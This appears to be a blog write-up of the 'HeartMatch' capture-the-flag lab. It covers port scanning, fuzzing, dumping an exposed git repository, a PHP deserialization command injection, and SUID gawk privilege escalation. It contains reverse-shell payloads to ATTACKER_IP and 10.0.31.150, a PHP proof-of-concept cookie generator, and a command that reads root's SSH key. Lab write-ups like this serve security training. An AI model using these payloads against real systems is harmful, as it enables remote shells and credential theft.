@@ -1,0 +1,191 @@
+---
+title: 'HeartMatch Writeup'
+date: '2025-05-12'
+tags: ['Insecure Desseralization', 'Linux', 'Hacking Club']
+draft: false
+summary: 'The HeartMatch machine is vulnerable to insecure desseralization and privilege escalation trough SUID'
+images: ['/static/images/hearthmatch-writeup-images/default.png']
+authors: ['default']
+---
+
+![heartmatch](/static/images/heartmatch-writeup-images/default.png)
+
+---
+
+## Port Scanning
+
+```bash
+export IP=172.16.8.163
+nmap -sV -sC -p- -v $IP --min-rate 3000
+```
+
+![heartmatch](/static/images/heartmatch-writeup-images/image.png)
+
+Only the ports 22 (SSH), 80 (HTTP) and 5173 (unkown) were found opened.
+
+## Enumeration
+
+```python
+curl -I 172.16.8.163
+```
+
+![heartmatch 1](/static/images/heartmatch-writeup-images/image1.png)
+
+When we tried to get the Headers, the application redirects to **heartmatch.hc** , we need to put this domain on our local DNS
+
+```python
+sudo vim /etc/hosts
+```
+
+![heartmatch 2](/static/images/heartmatch-writeup-images/image2.png)
+
+![heartmatch 3](/static/images/heartmatch-writeup-images/image3.png)
+
+Now we can access the application.
+
+### Fuzzing
+
+```python
+ffuf -w /usr/share/seclists/Fuzzing/fuzz-Bo0oM.txt -u http://heartmatch.hc/FUZZ -fw 54
+```
+
+![heartmatch 4](/static/images/heartmatch-writeup-images/image4.png)
+
+Somehow, the application is leaking internal files, like **hosts** and **passwd.**
+
+Checking the **/etc/hosts** file, we found a subdomain called `backoffice-admin-hm.heartmatch.hc`.
+
+We need to add this subdomain in our local DNS too.
+
+```python
+sudo vim /etc/hosts
+```
+
+![heartmatch 5](/static/images/heartmatch-writeup-images/image5.png)
+
+No we can access the subdomain
+
+![heartmatch 6](/static/images/heartmatch-writeup-images/image6.png)
+
+I registered a new account and log in into the application
+
+![heartmatch 7](/static/images/heartmatch-writeup-images/image7.png)
+
+![heartmatch 8](/static/images/heartmatch-writeup-images/image8.png)
+
+I checked the existing routes and nothing was found in this application too, so we are going to fuzzing part2.
+
+```python
+ffuf -w /usr/share/seclists/Fuzzing/fuzz-Bo0oM.txt -u http://backoffice-admin-hm.heartmatch.hc/FUZZ
+```
+
+![heartmatch 9](/static/images/heartmatch-writeup-images/image9.png)
+
+Ffuf found a git exposed.
+
+Using the tool git-dumper we downloaded all the files
+
+[https://github.com/arthaud/git-dumper](https://github.com/arthaud/git-dumper)
+
+```python
+git-dumper http://backoffice-admin-hm.heartmatch.hc/.git/ src
+```
+
+![heartmatch 10](/static/images/heartmatch-writeup-images/image10.png)
+
+With the source code of the application in hands, we can start de code review.
+
+### Code Review
+
+The PHP application was using object deserialization with the **UserSession** class, which included the following magic method:
+
+![heartmatch 11](/static/images/heartmatch-writeup-images/image11.png)
+
+The `__wakeup()` method is automatically called when an object is deserialized. The developer intended to validate the plan and then use **system()** to save it to a file named after the username.
+
+**The issue**
+
+The **username** field was not sanitized, which made it possible to inject arbitrary shell commands.
+
+Even though plan had to be "free" or "premium", nothing prevented username from containing dangerous input. For example:
+
+```python
+$username = "test.txt; bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'; #";
+```
+
+This causes the following system command to be executed:
+
+```python
+system("echo premium > /tmp/test.txt; bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'; #.txt");
+```
+
+In other words, after writing the plan to a file, the system executes the injected reverse shell command.
+
+### Proof of concept (POC)
+
+I crafted the following PHP object:
+
+```python
+<?php
+class UserSession {    public $username = "attacker.txt; bash -c 'bash -i >& /dev/tcp/10.0.31.150/1337 0>&1'; #";    public $plan = "premium";}
+echo base64_encode(serialize(new UserSession()));
+```
+
+![heartmatch 19](/static/images/heartmatch-writeup-images/falha1.png)
+
+---
+
+## Foot Hold
+
+After running our poc, it will generate a serialized base64 encoded and sent as the value of the **user_data** cookie.
+
+![heartmatch 12](/static/images/heartmatch-writeup-images/image12.png)
+
+Now we need to start our listener
+
+```python
+nc -lnvp 1337
+```
+
+After that, we send our payload into our cookie session and reload the page, so it can trigger the insecure desseralization
+
+![heartmatch 13](/static/images/heartmatch-writeup-images/image13.png)
+
+![heartmatch 14](/static/images/heartmatch-writeup-images/image14.png)
+
+---
+
+## Privillege Escalation
+
+**Gawk** binary with SUID permission
+
+```python
+find / -type f -perm -04000 -ls 2>/dev/null
+```
+
+![heartmatch 15](/static/images/heartmatch-writeup-images/image15.png)
+
+https://gtfobins.github.io/gtfobins/gawk/
+
+With this binary we can read any file in the server, so we can use to read the final flag, or get the root ssh key.
+
+```python
+LFILE=root/.ssh/id_rsa
+/usr/bin/gawk '//' "$LFILE"
+```
+
+![heartmatch 16](/static/images/heartmatch-writeup-images/image16.png)
+
+```python
+vim id_rsa
+chmod 600 id_rsa
+ssh root@172.16.8.163 -i id_rsa
+```
+
+![heartmatch 20](/static/images/heartmatch-writeup-images/falha2.png)
+
+---
+
+## Proof
+
+![heartmatch 17](/static/images/heartmatch-writeup-images/image17.png)
